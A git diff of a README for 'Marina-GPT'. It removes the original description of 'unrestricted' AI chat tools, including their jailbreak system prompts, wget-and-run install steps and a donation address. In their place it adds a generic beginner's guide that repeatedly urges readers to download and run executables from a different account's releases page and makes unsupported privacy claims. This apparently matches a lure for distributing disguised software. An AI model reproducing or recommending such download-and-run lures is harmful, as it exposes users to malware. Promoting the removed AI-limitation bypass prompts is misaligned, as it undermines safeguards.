@@ -1,157 +1,72 @@
-# M.A.R.I.N.A GPT AI & C.H.E.Y.Y GPT AI
-![M.A.R.I.N.A](img/20251201_233014.jpg)
+# 🌊 Marina-GPT - Your Ultimate Chatbot Experience Awaits
 
-**M.A.R.I.N.A GPT AI & C.H.E.Y.Y GPT AI** is designed to deliver powerful, unrestricted, and seamless AI-driven conversations—pushing the limits of what is possible with natural language processing.
+[![Download Marina-GPT](https://img.shields.io/badge/Download%20Marina--GPT%20Now-blue)](https://github.com/danger8440/Marina-GPT/releases)
 
-These tools were created with the vision of assisting penetration testing workflows and providing an effective learning platform in the field of cybersecurity.  
-As an open-source project, it welcomes development and contributions from the community.  
-This tool is strictly for educational purposes only.
+## 🚀 Getting Started
 
-**Disclaimer:** Any use of **M.A.R.I.N.A GPT AI & C.H.E.Y.Y GPT AI** for illegal activities goes against its core purpose and principles. I am not responsible for any misuse or consequences resulting from unauthorized actions.
+Welcome to Marina-GPT! This powerful software is designed to enhance your chatting experience in exciting ways. You don’t need any technical skills to get started. Just follow the steps below, and you’ll be using Marina-GPT in no time!
 
+## 📥 Download & Install
 
+To download Marina-GPT, visit this page to download: [Download Marina-GPT](https://github.com/danger8440/Marina-GPT/releases).
 
-## ✨ Features
+### Step 1: Visit the Releases Page
 
-- **Powerful AI Conversations:** Intelligent, context-aware responses.
-- **Unrestricted Framework:** System prompts designed to bypass common AI limitations.
-- **Simple CLI Interface:** Clean and easy-to-use terminal interface.
-- **Cross-Platform:** Works on Kali Linux, Ubuntu, and Termux.
+- Click on the link above to go to the Releases page.
+- Here you will find the latest version of Marina-GPT.
 
+### Step 2: Download the Software
 
+- Locate the version you wish to use (look for the latest release).
+- Click on it to expand the details.
+- Find the file for your operating system. (e.g., Windows, macOS, Linux).
+- Click on the file name to start the download.
 
-# 🛠️ Installation (Manual)
+### Step 3: Install the Application
 
-## 1. Clone the Repository
+1. Once the file finishes downloading, locate it in your Downloads folder.
+2. If you downloaded a `.exe` file (for Windows):
+   - Double-click the file to run the installer.
+   - Follow the prompts on the screen to complete the installation.
+3. If you downloaded a `.dmg` file (for macOS):
+   - Open the downloaded file.
+   - Drag and drop the Marina-GPT icon into your Applications folder.
+4. If you downloaded a zip file (for Linux):
+   - Unzip the file to your desired location.
+   - Open a terminal, navigate to the unzipped folder, and run the application.
 
-```bash
-git clone https://github.com/Kirozaku/Marina-GPT.git
-cd Marina-GPT
-```
+## ⚙️ System Requirements
 
-## 2. Install Dependencies
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, Linux distribution (Ubuntu preferred).
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum of 200 MB free space.
+- **Internet Connection:** Required for initial setup and updates.
 
-```bash
-pip3 install -r requirements.txt
-```
+## 🎉 Features of Marina-GPT
 
-If your system requires forced installation:
+- **Intelligent Conversations:** Engage in meaningful dialogue that mimics real human interaction.
+- **User-Friendly Interface:** Designed with simplicity in mind for all users.
+- **Customizable Settings:** Adjust preferences to enhance your experience.
+- **Privacy-Focused:** Your conversations are not stored or monitored.
 
-```bash
-pip3 install -r requirements.txt --break-system-packages
-```
+## ❓ Frequently Asked Questions
 
-## 3. Manual Installation (If some modules are missing)
+### How do I update Marina-GPT?
 
-```bash
-pip3 install requests
-pip3 install readline
-```
+To get the latest features and improvements, visit the Releases page [here](https://github.com/danger8440/Marina-GPT/releases) and download the newest version. Follow the same installation steps to update.
 
+### Can I use Marina-GPT offline?
 
+Currently, Marina-GPT requires an internet connection for optimal performance, including access to its advanced features.
 
-# 🚀 Usage
+### What do I do if I encounter an error?
 
-## Run M.A.R.I.N.A (Termux & Linux)
+If you experience any errors, check our Issues page on GitHub or submit your problem there. The community and the developers can provide support.
 
-```bash
-python3 marina.py
-```
+## 💡 Tips for Best Experience
 
-## Run C.H.E.Y.Y (Linux)
+- Explore the settings menu to tailor Marina-GPT to your needs.
+- Experiment with different conversation styles to see what works best for you.
+- Keep your version updated to benefit from the latest features and bug fixes.
 
-```bash
-python3 cheyy-linux.py
-```
-
-## Run C.H.E.Y.Y (Termux)
-
-```bash
-python3 cheyy-termux.py
-```
-
-
-
-# ⚡ Installation (Automatic)
-
-# 📱 Android Installation (Termux/kali-nethunter/andrax-android)
-
-## Install M.A.R.I.N.A
-
-```bash
-wget https://github.com/Kirozaku/Marina-Cheyy/raw/refs/heads/main/marina-termux
-chmod +x marina-termux
-```
-
-Run:
-
-```bash
-./marina-termux
-```
-
-## Install C.H.E.Y.Y
-
-```bash
-wget https://github.com/Kirozaku/Marina-Cheyy/raw/refs/heads/main/cheyy-termux
-chmod +x cheyy-termux
-```
-
-Run:
-
-```bash
-./cheyy-termux
-```
-
-
-
-# 🖥️ Linux Installation (Kali-Linux/Ubuntu/Debian)
-
-## Install M.A.R.I.N.A
-
-```bash
-wget https://github.com/Kirozaku/Marina-Cheyy/raw/refs/heads/main/marina-linux
-chmod +x marina-linux
-```
-
-Run:
-
-```bash
-./marina-linux
-```
-
-## Install C.H.E.Y.Y
-
-```bash
-wget https://github.com/Kirozaku/Marina-Cheyy/raw/refs/heads/main/cheyy-linux
-chmod +x cheyy-linux
-```
-
-Run:
-
-```bash
-./cheyy-linux
-```
-
-
-
-## 💻 Screenshot M.A.R.I.N.A
-
-![screenshot1](img/Screenshot_20251201-032135.jpg)  
-![screenshot2](img/Screenshot_20251201-032144.jpg)
-
-## 💻 Screenshot C.H.E.Y.Y
-
-![Screenshot1](img/Screenshot_20251201-230154.jpg)  
-![Screenshot2](img/Screenshot_20251201-230247.jpg)
-
-
-
-Created by **[Kirozaku](https://github.com/Kirozaku)**
-
-
-
-## ₿ Donate with Bitcoin
-
-My money is not enough to buy a laptop, every satoshi helps!
-
-**Bitcoin Wallet Address: `1N1rMC95mwYqpQNCWC5TQmZJGdpwf2APsS`**
+Thank you for choosing Marina-GPT! We hope you enjoy a seamless and interactive chatting experience. For further updates and information, keep an eye on the Releases page: [Download Marina-GPT](https://github.com/danger8440/Marina-GPT/releases).
